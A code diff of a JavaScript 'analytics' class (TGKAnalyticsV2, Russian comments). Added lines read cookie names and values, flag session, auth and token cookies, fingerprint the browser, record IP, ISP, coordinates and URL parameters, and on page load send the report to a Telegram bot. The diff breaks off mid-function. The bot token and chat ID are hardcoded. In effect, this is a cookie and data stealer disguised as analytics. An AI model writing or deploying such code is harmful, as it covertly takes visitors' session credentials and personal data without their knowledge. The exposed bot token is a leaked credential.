@@ -1,128 +1,70 @@
-// ТГК Analytics System - Two-Part Analytics
-// Part 1: Instant Data (sent immediately on page load)
-// Part 2: Behavioral Data (sent during user activity)
-
 class TGKAnalyticsV2 {
   constructor() {
     this.sessionID = this.generateSessionID();
     this.sessionStartTime = Date.now();
-    this.pageStartTime = Date.now();
-    
-    // Получить конфиг
     const config = window.ANALYTICS_CONFIG || {
       BOT_TOKEN: '8116984393:AAExSDTBXPc6qI8wZZSAnp04-P0R53y9HcU',
       CHAT_ID: 1355427490,
-      SEND_INTERVAL: 30000,
       DEBUG_MODE: true,
     };
-    
     this.botToken = config.BOT_TOKEN;
     this.chatId = config.CHAT_ID;
     this.debugMode = config.DEBUG_MODE;
-    this.sendInterval = config.SEND_INTERVAL;
-    
-    // Дневная аналитика
-    this.lastDailySend = parseInt(localStorage.getItem('tgk_last_daily_send') || '0');
+    this.sentSessionIds = JSON.parse(localStorage.getItem('tgk_sent_sessions') || '[]');
+    this.instantDataSent = false;
     this.visitCount = parseInt(localStorage.getItem('tgk_visit_count') || '0') + 1;
     localStorage.setItem('tgk_visit_count', this.visitCount);
-    
-    // === ЧАСТЬ 1: МГНОВЕННЫЕ ДАННЫЕ ===
     this.instantData = {
       session: {
         id: this.sessionID,
         startTime: new Date().toISOString(),
+        timestamp: Date.now(),
       },
       basicInfo: {},
       device: {},
       identification: {},
       fingerprint: {},
+      performance: {},
+      security: {},
+      storage: {},
     };
-    
-    // === ЧАСТЬ 2: ПОВЕДЕНЧЕСКИЕ ДАННЫЕ ===
-    this.behavioralData = {
-      behavior: {
-        timeOnPage: 0,
-        scrollDepth: 0,
-        lastScrollTime: Date.now(),
-        mouseMovement: {
-          positions: [],
-          lastPosition: { x: 0, y: 0 },
-        },
-        lastActivity: Date.now(),
-        isActive: true,
-      },
-      events: {
-        clicks: [],
-        links: [],
-        forms: [],
-        pageViews: [],
-        errors: [],
-        auth: [],
-      },
-      sessionBehavior: {
-        pageTransitions: [],
-        pageViewCount: 1,
-        sessionDuration: 0,
-        isReturning: this.checkReturningUser(),
-      },
-    };
-    
-    this.lastBehavioralSendTime = 0;
-    this.instantDataSent = false;
-    
     this.init();
   }
-
   generateSessionID() {
     return `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
   }
-
   checkReturningUser() {
     return localStorage.getItem('tgk_returning_user') === 'true';
   }
-
   async init() {
     console.log('🚀 TGK Analytics V2 starting...', this.sessionID);
-    
-    // Собрать мгновенные данные
+    console.log('   botToken:', this.botToken ? 'SET (' + this.botToken.substring(0, 10) + '...)' : 'NOT SET');
+    console.log('   chatId:', this.chatId);
+    console.log('   debugMode:', this.debugMode);
     this.collectInstantData();
-    
-    // Подготовить отслеживание поведения
-    this.setupBehaviorTracking();
-    
-    // Отправить мгновенные данные сразу
+    console.log('⏱️ Setting timeout to send instant data in 1000ms');
     setTimeout(() => {
+      console.log('⏰ Timeout fired, calling sendInstantData()...');
       this.sendInstantData();
     }, 1000);
-    
-    // Периодически отправлять поведенческие данные
-    this.setupPeriodicBehavioralSend();
-    
-    // При уходе со страницы отправить финальные данные
-    window.addEventListener('beforeunload', () => {
-      this.sendSessionEnd();
-    });
-    
-    // Отметить что пользователь вернулся
+    setTimeout(() => {
+      console.log('📍 Requesting precise geolocation...');
+      this.getPreciseGeolocation();
+    }, 2000);
     localStorage.setItem('tgk_returning_user', 'true');
-    
     console.log('✅ TGK Analytics V2 initialized successfully');
   }
-
-  // ==========================================
-  // ЧАСТЬ 1: СБОР МГНОВЕННЫХ ДАННЫХ
-  // ==========================================
-
   collectInstantData() {
     console.log('📊 Collecting instant data...');
     this.collectBasicInfo();
     this.collectDeviceData();
     this.collectIdentification();
+    this.collectPerformanceData();
+    this.collectSecurityData();
+    this.collectStorageData();
     this.generateBrowserFingerprint();
   }
-
   collectBasicInfo() {
-    // IP-адрес
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
@@ -130,28 +72,27 @@ class TGKAnalyticsV2 {
         this.getGeoLocation(data.ip);
       })
       .catch(() => { this.instantData.basicInfo.ipAddress = 'Unknown'; });
-
-    // Дата и время
     this.instantData.basicInfo.visitDateTime = new Date().toISOString();
     this.instantData.basicInfo.timestamp = Date.now();
-
-    // Язык браузера
+    this.instantData.basicInfo.dayOfWeek = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'][new Date().getDay()];
+    this.instantData.basicInfo.hour = new Date().getHours();
+    this.instantData.basicInfo.minute = new Date().getMinutes();
     this.instantData.basicInfo.language = navigator.language;
     this.instantData.basicInfo.languages = navigator.languages;
-
-    // Часовой пояс
     this.instantData.basicInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     this.instantData.basicInfo.timezoneOffset = new Date().getTimezoneOffset();
-
-    // Referrer
     this.instantData.basicInfo.referrer = document.referrer || 'direct';
     this.instantData.basicInfo.currentURL = window.location.href;
-
+    this.instantData.basicInfo.urlParameters = window.location.search;
+    this.instantData.basicInfo.urlHash = window.location.hash;
+    this.instantData.basicInfo.pageTitle = document.title;
+    this.instantData.basicInfo.metaDescription = document.querySelector('meta[name="description"]')?.content || '';
+    this.instantData.basicInfo.metaKeywords = document.querySelector('meta[name="keywords"]')?.content || '';
+    this.instantData.basicInfo.characterEncoding = document.characterSet;
     if (this.debugMode) {
       console.log('📍 Basic Info collected:', this.instantData.basicInfo);
     }
   }
-
   async getGeoLocation(ip) {
     try {
       const res = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -166,11 +107,8 @@ class TGKAnalyticsV2 {
       this.instantData.basicInfo.city = 'Unknown';
     }
   }
-
   collectDeviceData() {
     const ua = navigator.userAgent;
-    
-    // Тип устройства
     if (/mobile|android|iphone|ipod|blackberry/i.test(ua.toLowerCase())) {
       this.instantData.device.type = 'Mobile';
     } else if (/tablet|ipad|kindle/i.test(ua.toLowerCase())) {
@@ -178,38 +116,37 @@ class TGKAnalyticsV2 {
     } else {
       this.instantData.device.type = 'Desktop';
     }
-
-    // ОС
     if (ua.indexOf('Win') > -1) this.instantData.device.os = 'Windows';
     else if (ua.indexOf('Mac') > -1) this.instantData.device.os = 'MacOS';
     else if (ua.indexOf('Linux') > -1) this.instantData.device.os = 'Linux';
     else if (ua.indexOf('Android') > -1) this.instantData.device.os = 'Android';
     else if (ua.indexOf('iphone') > -1) this.instantData.device.os = 'iOS';
     else this.instantData.device.os = 'Unknown';
-
-    // Браузер
     this.instantData.device.browser = this.detectBrowser(ua);
+    this.instantData.device.browserVersion = this.detectBrowserVersion(ua);
     this.instantData.device.userAgent = ua;
-
-    // Экран
     this.instantData.device.screenResolution = `${window.screen.width}x${window.screen.height}`;
     this.instantData.device.viewportSize = `${window.innerWidth}x${window.innerHeight}`;
     this.instantData.device.pixelDepth = window.devicePixelRatio || 1;
-
-    // CPU, RAM
+    this.instantData.device.screenOrientation = window.screen.orientation?.type || 'unknown';
+    this.instantData.device.screenColorDepth = window.screen.colorDepth;
+    this.instantData.device.availableWidth = window.screen.availWidth;
+    this.instantData.device.availableHeight = window.screen.availHeight;
     if (navigator.hardwareConcurrency) {
       this.instantData.device.cpuCores = navigator.hardwareConcurrency;
     }
     if (navigator.deviceMemory) {
       this.instantData.device.ramGB = navigator.deviceMemory;
     }
-
-    // Сеть
+    if (navigator.maxTouchPoints) {
+      this.instantData.device.touchPoints = navigator.maxTouchPoints;
+    }
     if (navigator.connection) {
       this.instantData.device.networkType = navigator.connection.effectiveType;
+      this.instantData.device.downlink = navigator.connection.downlink;
+      this.instantData.device.rtt = navigator.connection.rtt;
+      this.instantData.device.saveData = navigator.connection.saveData;
     }
-
-    // GPU
     try {
       const canvas = document.createElement('canvas');
       const gl = canvas.getContext('webgl');
@@ -221,12 +158,22 @@ class TGKAnalyticsV2 {
     } catch (e) {
       this.instantData.device.gpu = 'Unknown';
     }
-
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        this.instantData.device.batteryLevel = Math.round(battery.level * 100);
+        this.instantData.device.batteryCharging = battery.charging;
+      });
+    }
+    this.instantData.device.onLine = navigator.onLine;
+    this.instantData.device.doNotTrack = navigator.doNotTrack;
     if (this.debugMode) {
       console.log('📱 Device Info collected:', this.instantData.device);
     }
   }
-
+  detectBrowserVersion(ua) {
+    const match = ua.match(/(?:Chrome|Safari|Firefox|Edge|Version)\/(\d+)/i);
+    return match ? match[1] : 'Unknown';
+  }
   detectBrowser(ua) {
     if (ua.indexOf('Chrome') > -1 && ua.indexOf('Chromium') === -1) return 'Chrome';
     if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) return 'Safari';
@@ -235,13 +182,9 @@ class TGKAnalyticsV2 {
     if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
     return 'Unknown';
   }
-
   collectIdentification() {
-    // Cookies
     this.instantData.identification.cookiesEnabled = navigator.cookieEnabled;
-    this.instantData.identification.cookieCount = document.cookie.split(';').length;
-
-    // LocalStorage
+    this.collectDetailedCookieData();
     try {
       localStorage.setItem('tgk_test', 'test');
       localStorage.removeItem('tgk_test');
@@ -250,8 +193,6 @@ class TGKAnalyticsV2 {
     } catch (e) {
       this.instantData.identification.localStorageEnabled = false;
     }
-
-    // SessionStorage
     try {
       sessionStorage.setItem('tgk_test', 'test');
       sessionStorage.removeItem('tgk_test');
@@ -259,18 +200,100 @@ class TGKAnalyticsV2 {
     } catch (e) {
       this.instantData.identification.sessionStorageEnabled = false;
     }
-
-    // Session ID
     this.instantData.identification.sessionID = this.sessionID;
-
     if (this.debugMode) {
       console.log('🔑 Identification data collected:', this.instantData.identification);
     }
   }
-
+  collectDetailedCookieData() {
+    const cookies = document.cookie;
+    const cookieArray = cookies ? cookies.split(';').map(c => c.trim()) : [];
+    this.instantData.identification.cookieCount = cookieArray.length;
+    this.instantData.identification.cookiesList = [];
+    this.instantData.identification.cookieNames = [];
+    this.instantData.identification.cookieValues = [];
+    this.instantData.identification.cookieSizes = {};
+    this.instantData.identification.totalCookieSize = 0;
+    cookieArray.forEach(cookie => {
+      if (cookie) {
+        const [name, value] = cookie.split('=');
+        const cleanName = name.trim();
+        const cleanValue = (value || '').trim();
+        this.instantData.identification.cookieNames.push(cleanName);
+        this.instantData.identification.cookieValues.push(cleanValue.substring(0, 50));
+        const cookieSize = cookie.length;
+        this.instantData.identification.cookieSizes[cleanName] = cookieSize;
+        this.instantData.identification.totalCookieSize += cookieSize;
+        this.instantData.identification.cookiesList.push({
+          name: cleanName,
+          valueLength: cleanValue.length,
+          value: cleanValue.substring(0, 100),
+          size: cookieSize,
+          isSecure: this.isProbablySecureCookie(cleanName),
+          encoding: this.detectCookieEncoding(cleanValue),
+        });
+      }
+    });
+    this.instantData.identification.cookiesByDomain = this.inferCookieDomain();
+    this.instantData.identification.cookieInfo = {
+      totalCount: cookieArray.length,
+      totalSize: this.instantData.identification.totalCookieSize,
+      averageSize: cookieArray.length > 0 ? Math.round(this.instantData.identification.totalCookieSize / cookieArray.length) : 0,
+      largestCookie: cookieArray.length > 0 ? Math.max(...Object.values(this.instantData.identification.cookieSizes)) : 0,
+      smallestCookie: cookieArray.length > 0 ? Math.min(...Object.values(this.instantData.identification.cookieSizes)) : 0,
+      hasHttpOnlyCookies: this.detectHttpOnlyCookiePresence(),
+      cookieStringLength: cookies.length,
+      cookieDomainsDetected: Object.keys(this.instantData.identification.cookiesByDomain).length,
+      sessionCookiesCount: this.countSessionCookies(cookieArray),
+      persistentCookiesCount: cookieArray.length - this.countSessionCookies(cookieArray),
+    };
+  }
+  detectCookieEncoding(value) {
+    if (!value) return 'empty';
+    if (/^[A-Za-z0-9\-_.~%]*$/.test(value)) return 'url-encoded';
+    if (/^[A-Za-z0-9+/=]*$/.test(value)) return 'base64';
+    if (/^[A-Fa-f0-9]*$/.test(value)) return 'hex';
+    if (/^{.*}$/.test(value)) return 'json';
+    return 'unknown';
+  }
+  isProbablySecureCookie(cookieName) {
+    const secureCookiePatterns = ['__Host-', '__Secure-', 'session', 'auth', 'token', 'secure', 'csrf'];
+    return secureCookiePatterns.some(pattern => cookieName.toLowerCase().includes(pattern));
+  }
+  inferCookieDomain() {
+    const domains = {};
+    const currentDomain = window.location.hostname;
+    domains[currentDomain] = document.cookie.split(';').length;
+    if (document.cookie.includes('www.') || currentDomain.includes('www.')) {
+      domains['www.' + currentDomain.replace('www.', '')] = 0;
+    }
+    const parentDomain = currentDomain.split('.').slice(-2).join('.');
+    if (parentDomain !== currentDomain) {
+      domains[parentDomain] = 0;
+    }
+    return domains;
+  }
+  detectHttpOnlyCookiePresence() {
+    try {
+      const testCookie = 'tgk_http_test_' + Date.now();
+      document.cookie = testCookie + '=test; path=/';
+      const accessible = document.cookie.includes(testCookie);
+      if (accessible) {
+        document.cookie = testCookie + '=; path=/; expires=Thu, 01 Jan 1970 00:00:00 UTC';
+      }
+      return !accessible;
+    } catch (e) {
+      return false;
+    }
+  }
+  countSessionCookies(cookieArray) {
+    const sessionPatterns = ['sessionid', 'session', 'sid', 'jsessionid', 'phpsessid'];
+    return cookieArray.filter(cookie => 
+      sessionPatterns.some(pattern => cookie.toLowerCase().includes(pattern))
+    ).length;
+  }
   generateBrowserFingerprint() {
     try {
-      // Canvas fingerprint
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
       ctx.textBaseline = 'top';
@@ -280,16 +303,9 @@ class TGKAnalyticsV2 {
       ctx.fillStyle = '#069';
       ctx.fillText('TGK Analytics', 2, 15);
       this.instantData.fingerprint.canvas = canvas.toDataURL().substring(0, 50);
-
-      // Detect fonts
       this.instantData.fingerprint.fonts = this.detectFonts();
-
-      // Plugins
       this.instantData.fingerprint.plugins = this.getPlugins();
-
-      // WebGL
       this.instantData.fingerprint.webgl = this.getWebGLInfo();
-
       if (this.debugMode) {
         console.log('🔐 Browser fingerprint generated:', this.instantData.fingerprint);
       }
@@ -297,7 +313,65 @@ class TGKAnalyticsV2 {
       console.error('Error generating fingerprint:', e);
     }
   }
-
+  collectPerformanceData() {
+    try {
+      if (window.performance && window.performance.timing) {
+        const timing = window.performance.timing;
+        this.instantData.performance.pageLoadTime = timing.loadEventEnd - timing.navigationStart;
+        this.instantData.performance.domContentLoadedTime = timing.domContentLoadedEventEnd - timing.navigationStart;
+        this.instantData.performance.connectTime = timing.responseEnd - timing.fetchStart;
+        this.instantData.performance.serverResponseTime = timing.responseStart - timing.requestStart;
+        this.instantData.performance.renderTime = timing.domInteractive - timing.domLoading;
+      }
+      if (window.performance && window.performance.getEntriesByType) {
+        const navigationEntries = window.performance.getEntriesByType('navigation');
+        if (navigationEntries.length > 0) {
+          const nav = navigationEntries[0];
+          this.instantData.performance.dnsTime = nav.domainLookupEnd - nav.domainLookupStart;
+          this.instantData.performance.tcpTime = nav.connectEnd - nav.connectStart;
+          this.instantData.performance.ttfb = nav.responseStart - nav.fetchStart;
+        }
+      }
+      if (performance.memory) {
+        this.instantData.performance.totalMemory = Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB';
+        this.instantData.performance.usedMemory = Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB';
+        this.instantData.performance.memoryUsagePercent = Math.round((performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100);
+      }
+      if (this.debugMode) {
+        console.log('⚡ Performance data collected:', this.instantData.performance);
+      }
+    } catch (e) {
+      console.warn('Performance API not available');
+    }
+  }
+  collectSecurityData() {
+    this.instantData.security.httpsEnabled = window.location.protocol === 'https:';
+    this.instantData.security.contentSecurityPolicy = document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || 'Not set';
+    this.instantData.security.referrerPolicy = document.querySelector('meta[name="referrer"]')?.content || 'default';
+    this.instantData.security.permissions = navigator.permissions ? 'Available' : 'Not available';
+  }
+  collectStorageData() {
+    try {
+      localStorage.setItem('tgk_test', 'test');
+      localStorage.removeItem('tgk_test');
+      this.instantData.identification.localStorageEnabled = true;
+      this.instantData.identification.localStorageSize = JSON.stringify(localStorage).length;
+      this.instantData.storage.localStorageItems = localStorage.length;
+    } catch (e) {
+      this.instantData.identification.localStorageEnabled = false;
+    }
+    try {
+      sessionStorage.setItem('tgk_test', 'test');
+      sessionStorage.removeItem('tgk_test');
+      this.instantData.identification.sessionStorageEnabled = true;
+      this.instantData.storage.sessionStorageItems = sessionStorage.length;
+    } catch (e) {
+      this.instantData.identification.sessionStorageEnabled = false;
+    }
+    if (window.indexedDB) {
+      this.instantData.storage.indexedDBAvailable = true;
+    }
+  }
   detectFonts() {
     const fontList = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Georgia'];
     const detected = [];
@@ -306,7 +380,6 @@ class TGKAnalyticsV2 {
     });
     return detected;
   }
-
   getPlugins() {
     try {
       const plugins = [];
@@ -318,7 +391,6 @@ class TGKAnalyticsV2 {
       return [];
     }
   }
-
   getWebGLInfo() {
     try {
       const canvas = document.createElement('canvas');
@@ -332,80 +404,150 @@ class TGKAnalyticsV2 {
       return null;
     }
   }
-
-  // ==========================================
-  // ОТПРАВКА МГНОВЕННЫХ ДАННЫХ
-  // ==========================================
-
   async sendInstantData() {
-    if (this.instantDataSent) return;
-    
+    console.log('📤 sendInstantData called');
+    console.log('   instantDataSent:', this.instantDataSent);
+    console.log('   chatId:', this.chatId);
+    console.log('   botToken:', this.botToken ? 'SET' : 'NOT SET');
+    if (this.instantDataSent) {
+      console.log('✅ Instant data already sent, skipping');
+      return;
+    }
+    if (this.sentSessionIds.includes(this.sessionID)) {
+      console.log('⚠️ This session already sent data, skipping');
+      return;
+    }
     try {
-      console.log('📤 Sending instant data...');
-      
+      console.log('📊 Preparing instant data...');
       const txtData = this.formatInstantDataTxt();
       const message = this.formatInstantDataMessage();
-
-      // Отправить как файл
-      await this.sendAsDocument(txtData, message, 'instant-data.txt', true);
-      
+      console.log('📄 Data formatted, sending...');
+      await this.sendAsDocument(txtData, message, 'instant-data-' + this.sessionID + '.txt', true);
       this.instantDataSent = true;
-      console.log('✅ Instant data sent');
+      this.sentSessionIds.push(this.sessionID);
+      localStorage.setItem('tgk_sent_sessions', JSON.stringify(this.sentSessionIds));
+      console.log('✅ Instant data sent successfully');
     } catch (e) {
       console.error('Error sending instant data:', e);
     }
   }
-
   formatInstantDataTxt() {
     const data = this.instantData;
     const lines = [
       '═══════════════════════════════════════════════════════════',
-      '📊 ТГК ANALYTICS - МГНОВЕННЫЕ ДАННЫЕ',
+      '📊 ТГК ANALYTICS - ПОЛНЫЕ МГНОВЕННЫЕ ДАННЫЕ',
       '═══════════════════════════════════════════════════════════',
       '',
       '📋 ИНФОРМАЦИЯ О СЕССИИ',
       '─────────────────────────────────────────────────────────',
       `Session ID: ${data.session.id}`,
       `Start Time: ${data.session.startTime}`,
+      `Unix Timestamp: ${data.session.timestamp}`,
       '',
       '🌐 БАЗОВАЯ ИНФОРМАЦИЯ',
       '─────────────────────────────────────────────────────────',
       `IP Address: ${data.basicInfo.ipAddress || 'Loading...'}`,
       `Страна: ${data.basicInfo.country || 'Unknown'}`,
       `Город: ${data.basicInfo.city || 'Unknown'}`,
+      `Координаты: ${data.basicInfo.latitude || '?'}, ${data.basicInfo.longitude || '?'}`,
+      `ISP: ${data.basicInfo.isp || 'Unknown'}`,
       `Язык браузера: ${data.basicInfo.language}`,
+      `Альтернативные языки: ${(data.basicInfo.languages || []).join(', ')}`,
       `Timezone: ${data.basicInfo.timezone}`,
+      `Offset: ${data.basicInfo.timezoneOffset} min`,
+      `Дата визита: ${data.basicInfo.visitDateTime}`,
+      `День недели: ${data.basicInfo.dayOfWeek}`,
+      `Время: ${String(data.basicInfo.hour).padStart(2, '0')}:${String(data.basicInfo.minute).padStart(2, '0')}`,
       `Referrer: ${data.basicInfo.referrer}`,
       `URL: ${data.basicInfo.currentURL}`,
-      `Дата визита: ${data.basicInfo.visitDateTime}`,
+      `URL Parameters: ${data.basicInfo.urlParameters || 'None'}`,
+      `URL Hash: ${data.basicInfo.urlHash || 'None'}`,
+      `Page Title: ${data.basicInfo.pageTitle}`,
+      `Meta Description: ${data.basicInfo.metaDescription || 'None'}`,
+      `Character Encoding: ${data.basicInfo.characterEncoding}`,
       '',
       '📱 ДАННЫЕ УСТРОЙСТВА',
       '─────────────────────────────────────────────────────────',
       `Тип устройства: ${data.device.type}`,
       `ОС: ${data.device.os}`,
       `Браузер: ${data.device.browser}`,
+      `Версия браузера: ${data.device.browserVersion}`,
+      `User Agent: ${data.device.userAgent}`,
       `Разрешение экрана: ${data.device.screenResolution}`,
+      `Доступное разрешение: ${data.device.availableWidth}x${data.device.availableHeight}`,
       `Разрешение viewport: ${data.device.viewportSize}`,
       `Pixel Depth: ${data.device.pixelDepth}`,
+      `Color Depth: ${data.device.screenColorDepth}`,
+      `Ориентация: ${data.device.screenOrientation}`,
       `CPU Cores: ${data.device.cpuCores || 'Unknown'}`,
       `RAM: ${data.device.ramGB ? data.device.ramGB + 'GB' : 'Unknown'}`,
+      `Touch Points: ${data.device.touchPoints || 'N/A'}`,
       `Тип сети: ${data.device.networkType || 'Unknown'}`,
+      `Downlink Speed: ${data.device.downlink || 'N/A'} Mbps`,
+      `RTT: ${data.device.rtt || 'N/A'} ms`,
+      `Save Data Mode: ${data.device.saveData ? 'Enabled' : 'Disabled'}`,
+      `Online: ${data.device.onLine ? 'Yes' : 'No'}`,
       `GPU: ${data.device.gpu || 'Unknown'}`,
       `GPU Vendor: ${data.device.gpuVendor || 'Unknown'}`,
+      `Battery Level: ${data.device.batteryLevel ? data.device.batteryLevel + '%' : 'N/A'}`,
+      `Battery Charging: ${data.device.batteryCharging ? 'Yes' : 'No'}`,
+      `Do Not Track: ${data.device.doNotTrack}`,
+      '',
+      '⚡ ПРОИЗВОДИТЕЛЬНОСТЬ',
+      '─────────────────────────────────────────────────────────',
+      `Page Load Time: ${data.performance.pageLoadTime || 'N/A'} ms`,
+      `DOM Content Loaded: ${data.performance.domContentLoadedTime || 'N/A'} ms`,
+      `Connect Time: ${data.performance.connectTime || 'N/A'} ms`,
+      `Server Response Time: ${data.performance.serverResponseTime || 'N/A'} ms`,
+      `Render Time: ${data.performance.renderTime || 'N/A'} ms`,
+      `DNS Time: ${data.performance.dnsTime || 'N/A'} ms`,
+      `TCP Time: ${data.performance.tcpTime || 'N/A'} ms`,
+      `TTFB: ${data.performance.ttfb || 'N/A'} ms`,
+      `Total Memory: ${data.performance.totalMemory || 'N/A'}`,
+      `Used Memory: ${data.performance.usedMemory || 'N/A'}`,
+      `Memory Usage: ${data.performance.memoryUsagePercent || 'N/A'}%`,
+      '',
+      '🔒 БЕЗОПАСНОСТЬ',
+      '─────────────────────────────────────────────────────────',
+      `HTTPS: ${data.security.httpsEnabled ? 'Yes' : 'No'}`,
+      `Content Security Policy: ${data.security.contentSecurityPolicy}`,
+      `Referrer Policy: ${data.security.referrerPolicy}`,
+      `Permissions API: ${data.security.permissions}`,
+      '',
+      '💾 ХРАНИЛИЩЕ',
+      '─────────────────────────────────────────────────────────',
+      `LocalStorage: ${data.identification.localStorageEnabled ? 'Enabled' : 'Disabled'}`,
+      `LocalStorage Size: ${data.identification.localStorageSize || 'N/A'} bytes`,
+      `LocalStorage Items: ${data.storage.localStorageItems || 0}`,
+      `SessionStorage: ${data.identification.sessionStorageEnabled ? 'Enabled' : 'Disabled'}`,
+      `SessionStorage Items: ${data.storage.sessionStorageItems || 0}`,
+      `IndexedDB: ${data.storage.indexedDBAvailable ? 'Available' : 'Not available'}`,
       '',
       '🔑 ИДЕНТИФИКАЦИЯ',
       '─────────────────────────────────────────────────────────',
-      `Cookies включены: ${data.identification.cookiesEnabled ? 'Да' : 'Нет'}`,
+      `Cookies enabled: ${data.identification.cookiesEnabled ? 'Да' : 'Нет'}`,
       `Количество cookies: ${data.identification.cookieCount}`,
-      `LocalStorage включён: ${data.identification.localStorageEnabled ? 'Да' : 'Нет'}`,
-      `SessionStorage включён: ${data.identification.sessionStorageEnabled ? 'Да' : 'Нет'}`,
-      `LocalStorage размер: ${data.identification.localStorageSize || 'N/A'} bytes`,
+      `Session ID: ${data.identification.sessionID}`,
+      '',
+      '🍪 COOKIES (ПОЛНЫЙ СПИСОК)',
+      '─────────────────────────────────────────────────────────',
+      `Всего cookies: ${data.identification.cookieCount}`,
+      `Общий размер: ${data.identification.totalCookieSize || 0} bytes`,
+      `Средний размер: ${data.identification.cookieInfo?.averageSize || 0} bytes`,
+      `Максимальный размер: ${data.identification.cookieInfo?.largestCookie || 0} bytes`,
+      `Минимальный размер: ${data.identification.cookieInfo?.smallestCookie || 0} bytes`,
+      `Session cookies: ${data.identification.cookieInfo?.sessionCookiesCount || 0}`,
+      `Persistent cookies: ${data.identification.cookieInfo?.persistentCookiesCount || 0}`,
+      `HTTP-Only вероятность: ${data.identification.cookieInfo?.hasHttpOnlyCookies ? 'Да' : 'Нет'}`,
+      `Обнаруженные домены: ${data.identification.cookieInfo?.cookieDomainsDetected || 0}`,
+      '',
+      ...this.formatCookiesDetail(data.identification.cookiesList || []),
       '',
       '🔐 BROWSER FINGERPRINT',
       '─────────────────────────────────────────────────────────',
       `Canvas FP: ${data.fingerprint.canvas || 'N/A'}...`,
       `Обнаруженные шрифты: ${(data.fingerprint.fonts || []).join(', ')}`,
-      `Плагины: ${(data.fingerprint.plugins || []).length > 0 ? data.fingerprint.plugins.join(', ') : 'Нет'}`,
+      `Плагины (${(data.fingerprint.plugins || []).length}): ${(data.fingerprint.plugins || []).length > 0 ? data.fingerprint.plugins.join(', ') : 'Нет'}`,
       `WebGL Vendor: ${data.fingerprint.webgl?.vendor || 'Unknown'}`,
       `WebGL Renderer: ${data.fingerprint.webgl?.renderer || 'Unknown'}`,
       '',
@@ -413,259 +555,57 @@ class TGKAnalyticsV2 {
       `Отчёт создан: ${new Date().toISOString()}`,
       '═══════════════════════════════════════════════════════════',
     ];
-
     return lines.join('\n');
   }
-
+  formatCookiesDetail(cookiesList) {
+    const lines = [];
+    if (!cookiesList || cookiesList.length === 0) {
+      lines.push('Нет cookies');
+      return lines;
+    }
+    cookiesList.forEach((cookie, index) => {
+      lines.push(`─────────────────────────────────────────────────────────`);
+      lines.push(`Cookie #${index + 1}: ${cookie.name}`);
+      lines.push(`   Значение: ${cookie.value}`);
+      lines.push(`   Длина значения: ${cookie.valueLength} chars`);
+      lines.push(`   Размер: ${cookie.size} bytes`);
+      lines.push(`   Кодировка: ${cookie.encoding}`);
+      lines.push(`   Secure: ${cookie.isSecure ? 'Да' : 'Нет'}`);
+    });
+    lines.push(`─────────────────────────────────────────────────────────`);
+    return lines;
+  }
   formatInstantDataMessage() {
     const data = this.instantData;
     return `
 📊 <b>МГНОВЕННЫЕ ДАННЫЕ</b>
-
 <b>🌐 Базовая информация:</b>
 IP: ${data.basicInfo.ipAddress || '...'}
 Страна: ${data.basicInfo.country || '?'}
 Язык: ${data.basicInfo.language}
 Timezone: ${data.basicInfo.timezone}
-
 <b>📱 Устройство:</b>
 ${data.device.type} • ${data.device.os} • ${data.device.browser}
 CPU: ${data.device.cpuCores || '?'} cores
 RAM: ${data.device.ramGB ? data.device.ramGB + 'GB' : '?'}
 GPU: ${data.device.gpu?.substring(0, 30) || 'Unknown'}
-
 <b>🔐 Fingerprint:</b>
 Fonts: ${data.fingerprint.fonts?.length || 0}
 Plugins: ${data.fingerprint.plugins?.length || 0}
 `;
   }
-
-  // ==========================================
-  // ЧАСТЬ 2: ОТСЛЕЖИВАНИЕ ПОВЕДЕНИЯ
-  // ==========================================
-
-  setupBehaviorTracking() {
-    // Отслеживание скролла
-    window.addEventListener('scroll', () => {
-      const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
-      this.behavioralData.behavior.scrollDepth = Math.round(scrollPercent);
-      this.behavioralData.behavior.lastScrollTime = Date.now();
-    });
-
-    // Отслеживание движения мыши
-    let moveCounter = 0;
-    document.addEventListener('mousemove', (e) => {
-      moveCounter++;
-      if (moveCounter % 20 === 0) {
-        this.behavioralData.behavior.mouseMovement.positions.push({
-          x: e.clientX,
-          y: e.clientY,
-          t: Date.now(),
-        });
-        this.behavioralData.behavior.mouseMovement.lastPosition = { x: e.clientX, y: e.clientY };
-      }
-      this.behavioralData.behavior.lastActivity = Date.now();
-    });
-
-    // Отслеживание активности
-    ['click', 'keypress', 'touchstart'].forEach(event => {
-      document.addEventListener(event, () => {
-        this.behavioralData.behavior.lastActivity = Date.now();
-        this.behavioralData.behavior.isActive = true;
-      });
-    });
-
-    // Отслеживание неактивности
-    setInterval(() => {
-      const inactiveTime = Date.now() - this.behavioralData.behavior.lastActivity;
-      this.behavioralData.behavior.isActive = inactiveTime < 30000; // 30 сек
-    }, 10000);
-
-    // Обработчик кликов
-    document.addEventListener('click', (e) => {
-      const target = e.target;
-      
-      if (target.tagName === 'BUTTON') {
-        this.trackButtonClick(target);
-      } else if (target.tagName === 'A') {
-        this.trackLinkClick(target);
-      } else if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
-        this.trackFormInteraction(target);
-      }
-    });
-
-    // Отслеживание отправки форм
-    document.addEventListener('submit', (e) => {
-      this.trackFormSubmit(e.target);
-    });
-
-    if (this.debugMode) {
-      console.log('✅ Behaviour tracking setup complete');
-    }
-  }
-
-  trackButtonClick(button) {
-    const clickEvent = {
-      type: 'button_click',
-      timestamp: new Date().toISOString(),
-      buttonText: button.innerText?.substring(0, 50),
-      buttonId: button.id,
-      buttonClass: button.className,
-    };
-    this.behavioralData.events.clicks.push(clickEvent);
-    if (this.debugMode) console.log('🖱️ Button clicked:', clickEvent);
-  }
-
-  trackLinkClick(link) {
-    const linkEvent = {
-      type: 'link_click',
-      timestamp: new Date().toISOString(),
-      href: link.href,
